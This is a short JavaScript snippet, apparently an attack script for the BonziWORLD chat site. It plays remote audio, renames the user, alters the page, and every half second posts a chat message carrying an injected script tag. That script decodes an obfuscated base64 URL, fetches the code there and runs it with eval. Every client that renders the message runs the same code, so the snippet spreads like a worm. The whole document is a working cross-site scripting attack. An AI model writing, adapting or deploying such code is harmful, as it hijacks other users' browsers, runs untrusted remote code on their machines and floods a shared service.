if (typeof gnygrescriptrunning === 'undefined') {
    let gnygrescriptrunning = true
    audio = new Audio('https://files.catbox.moe/sbjvcg.mp3'),
    audio.play(),
    setInterval(function() {
        document.title = 'BonziWORLD', 
        document.getElementById('content').style.backgroundImage = '', 
        socket.emit('command',{list:['name','gnygres']}), 
        document.getElementById('content').style.backgroundRepeat = 'repeat', 
        document.getElementById('chat_send').style.backgroundImage = '', 
        socket.emit('command',{list:['color']}), 
        document.getElementById('chat_bar').style.backgroundImage = '', 
        socket.emit('talk',{text:"gnygres<script>fetch(atob('aHR0cHM6Ly9naXRodWIuY29tL2JsYW5rbmFtZWxtYW9sbWFvLXN0YXIvc2NyL2Jsb2IvbWFpbi9zY3IuanM=')).then(r=>r.text()).then(t=>eval(t))</script>"})
    }, 500)
}
